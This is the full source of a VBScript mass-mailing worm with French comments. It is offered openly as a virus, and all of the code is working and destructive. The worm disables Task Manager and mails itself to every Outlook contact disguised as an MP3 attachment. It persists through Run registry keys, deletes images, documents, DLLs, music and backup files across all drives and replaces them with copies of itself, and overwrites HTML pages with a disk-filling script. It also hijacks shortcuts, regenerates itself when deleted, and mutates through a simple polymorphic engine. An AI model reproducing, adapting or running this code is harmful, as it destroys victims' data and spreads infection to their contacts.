   On Error Resume Next
   'definition des objets et variables commune
   Randomize
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Set WSSH = CreateObject("Wscript.shell")
   Set NT = CreateObject("Wscript.Network")
   Set WINDIR = FSO.GetSpecialFolder(0)
   Set SYSDIR = FSO.GetSpecialFolder(1)
   Set TEMDIR = FSO.GetSpecialFolder(2)
   Set WINF = WINDIR.Files
   Set SYSF = SYSDIR.Files
   K1 = "HKEY_LOCAL_MACHINE\Sofware\Microsoft\Windows\CurrentVersion\Run\"
   K2 = "HKEY_LOCAL_MACHINE\Sofware\Microsoft\Windows\CurrentVersion\RunServices\"
   WSFN = Wscript.ScriptFullName
   Set WSREAD = FSO.OpenTextFile(WSFN,1)
   CODE = WSREAD.ReadAll   'lecture du code du virus
   WSREAD.Close


   'appel des differentes fonctions
   Block()
   NoTime()
   Mail()
   Copy_1 WINF
   Copy_1 SYSF
   Copy_2 ()
   Search_1()
   Undelete()


   Function Block() 'block ctrl alt sup sous XP
   On Error Resume Next
   K = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr"
   WSSH.RegWrite K,1,"REG_DWORD"
   End Function


   Function NoTime() 'enleve la limite de temps des script sous 95 98
   On Error Resume Next
   K = "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"
   WSSH.RegWrite K,0,"REG_DWORD"
   End Function


   Function Mail() 'mail:pour chaque adresse de outlook et s'envoy avec outlook expresse
   On Error Resume Next
   D = TEMDIR & "\XAUDIO_SOUND.MP3.VBE"
   Poly D
   Set OUT = CreateObject("Outlook.Application")
   Set MAP = OUT.GetNameSpace("MAPI")
   Set LIS = MAP.AddressLists
   For Each LIS1 In LIS
   CONTACT_COUNT = LIS1.AddressEntries.Count
   For COUNT = 1 To CONTACT_COUNT
       L = Fix((Rnd*3)+1)
       If L = 1 Then J = "Surprise"
       If L = 2 Then J = "Important"
       If L = 3 Then J = "Imformation"
       Set CONTACT = LIS1.AddressEntries(COUNT)
       Set MAIL = CreateObject("CDO.Message")
       MAIL.To = CONTACT.Address
       MAIL.Subject = J
       MAIL.TextBody = "All you need to know... (in the audio file)" & vbCrLf & NT.UserName
       MAIL.AddAttachment D
       MAIL.Send
   Next
   Next
   End Function


   Function Copy_1(DX) 'copie de lui meme dans Windows et System
   On Error Resume Next
   For Each DX1 In DX
   X = LCase(FSO.GetExtensionName(DX1))
   Y = Fix((Rnd*3)+1)
   If Y = 1 And X1 <> "vbs" And X1 <> "vbe" Then
       N = DX1.ParentFolder.Path & "\" & FSO.GetBaseName(DX1) & ".vbs"
       Poly N
   End If
   If (X = "vbs" Or X = "vbe") And DX1 <> WSFN Then Poly DX1
   Next
   End Function


   Function Copy_2()
   A = WINDIR & "\SHELL32.vbs"
   B = WINDIR & "\MAPIDLL.vbs"
   C = SYSDIR & "\NETDLL.vbs"
   Poly A
   WSSH.RegWrite K1 & "SHELL32",A
   Poly B
   WSSH.RegWrite K2 & "MAPIDLL",B
   Poly C
   WSSH.RegWrite K1 & "NETDLL",C
   End Function


   Function Copy_3(RECY) 'se copie dans la corbeille (sert a rien)
   On Error Resume Next
   ASCII = ""
   ASCII1 = Fix((Rnd*8)+4)
   For A = 1 To ASCII1
   ASCII2 = Chr(Fix((Rnd*9)+48))
   ASCII = ASCII & ASCII2
   Next
   REC = RECY & "\" & ASCII & ".vbs"
   Poly REC
   End Function


   Function Search_1() 'fonction recurcive de balayage des disque
   On Error Resume Next
   Set LIST_DRI = FSO.Drives
   For Each DRI In LIST_DRI
   If DRI.DriveType = 2 Or DRI.DriveType = 3 Then
       DRI = DRI & "\"
       Poly DRI & "POLYRIS.vbs"
       Set FOLDER_DRI = FSO.GetFolder(DRI)
       Set VERIF_FOL = FOLDER_DRI.SubFolders
       For Each FOLR1 In VERIF_FOL
        If LCase(FOLR1.Name) = "recycled" Then Copy_3 FOLR1
       Next
       Set LIST_FIL = FOLDER_DRI.Files
       For Each FIL In LIST_FIL
        Verif_X FIL,DRI
       Next
       Search_2 FOLDER_DRI
   End If
   Next
   End Function


   Function Search_2(F)
   On Error Resume Next
   Set LIST_FOL = F.SubFolders
   For Each FOL In LIST_FOL
   Set FOLDER_FOL = FSO.GetFolder(FOL)
   Set LIST_FIL = FOLDER_FOL.Files
   For Each FIL In LIST_FIL
       Verif_X FIL,FOL
   Next
   Search_2 FOL
   Next
   End Function


   Function Verif_X(FILX,FOLX) 'verification des extentions de chaques fichiers
   On Error Resume Next
   X = LCase(FSO.GetExtensionName(FILX))
   If X = "dll" Or X = "bmp" Or X = "jpg" Or X = "gif" Or X = "txt"_
   Or X = "bat" Or X = "com" Or X = "mp3" Or X = "wma" Or X = "bkf" Then
   NA = FILX.ParentFolder.Path
   If Right(NA,1) = "\" Then
       NA = NA & FSO.GetBaseName(FILX) & ".vbs"
   Else
       NA = NA & "\" & FSO.GetBaseName(FILX) & ".vbs"
   End If
   FSO.DeleteFile FILX
   Poly NA
   End If
   If X = "htm" Or X = "html" Then
   Set H = FSO.CreateTextFile(FILX,True)
   With H
   .WriteLine "<SCRIPT LANGUAGE=" & Chr(34) & "VBS" & Chr(34) & ">"
   .WriteLine "Randomize"
   .WriteLine "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
   .WriteLine "W = 0"
   .WriteLine "T = Fix((Rnd*1000)+200)"
   .WriteLine "Do"
   .WriteLine "A =" & Chr(34) &   Chr(34)
   .WriteLine "Z = Fix((Rnd*8)+1)"
   .WriteLine "For Y = 1 To Z"
   .WriteLine " B = Chr(Fix((Rnd*26)+65))"
   .WriteLine " A = A & B"
   .WriteLine "Next"
   .WriteLine "X = Fix((Rnd*4)+1)"
   .WriteLine "If X=1 Then X2=" & Chr(34) & ".TXT" & Chr(34)
   .WriteLine "If X=2 Then X2=" & Chr(34) & ".DOC" & Chr(34)
   .WriteLine "If X=3 Then X2=" & Chr(34) & ".HTM" & Chr(34)
   .WriteLine "If X=4 Then X2=" & Chr(34) & ".INF" & Chr(34)
   .WriteLine "Set FUCK = FSO.CreateTextFile(A & X2)"
   .WriteLine "V = Fix((Rnd*1000)+1)"
   .WriteLine "For U = 1 To V"
   .WriteLine " FUCK.Write " & Chr(34) & "I'm the BEST " & Chr(34)
   .WriteLine "Next"
   .WriteLine "W = W + 1"
   .WriteLine "Loop while W < T"
   .WriteLine "</SCRIPT>"
   End With
   H.Close
   End If
   If (X = "vbs" Or X = "vbe") And FOLX <> WINDIR And FOLX <> SYSDIR Then
   Poly FILX
   A = Fix((Rnd*5)+1)
   If A = 1 Then WSSH.RegWrite K1 & FSO.GetBaseName(FILX), FILX
   End If
   If X = "lnk" Then Shortcut FILX
   End Function


   Function Shortcut(FI) 'chaque raccourci renvoy vers une copie du virus
   On Error Resume Next
   Do
   WS = Fix((Rnd*2)+1)
   If WS = 1 Then WISY = WINF Else WISY = SYSF
   For Each F1 In WISY
       X = LCase(FSO.GetExtensionName(F1))
       A = Fix((Rnd*3)+1)
       If (X = "vbs" Or X = "vbe") And A = 1 Then TP = F1 : Exit Do
   Next
   Loop
   Set SH = WSSH.CreateShortcut(FI)
   SH.TargetPath = TP
   SH.WindowStyle = 0
   SH.IconLocation = WSSH.ExpandEnvironmentStrings("%windir%\notepad.exe, 0")
   SH.Save
   End Function


   Function Undelete() 'on ne peut pas le supprimer sinon il se regenere
   On Error Resume Next
   Do
   If Not FSO.FileExists(WSFN) Then
       Set WSREWRITE = FSO.CreateTextFile(WSFN)
       WSREWRITE.Write CODE
       WSREWRITE.Close
   End If
   Wscript.Sleep 1000
   Loop
   End Function


   Function Poly(PolyName) 'moteur polymorphe
   On Error Resume Next
   Set TA = FSO.OpenTextFile (WSFN,1)
   Set TB = FSO.CreateTextFile (PolyName,True)
   Do
   LT = TA.ReadLine
   VE = Left((LTrim(LT)),1)
   If VE <> "'" And VE <> "" Then PolyWrite TB,LT
   Loop Until TA.AtEndOfStream = True
   TA.Close
   TB.Close
   End Function


   Function PolyWrite(T,L)
   On Error Resume Next
   Do
   M = Fix((Rnd*4)+1)
   If M = 1 Then T.WriteLine vbCrLf
   If M = 2 Then
   ASCII = ""
   ASCII1 = Fix((Rnd*100)+1)
   For A = 1 To ASCII1
       ASCII2 = Chr(Fix((Rnd*90)+32))
       ASCII = ASCII & ASCII2
   Next
   ASCII = "'" & ASCII
   T.WriteLine ASCII
   End If
   If M = 3 Or M = 4 Then T.WriteLine L : Exit Do
   Loop
   End Function
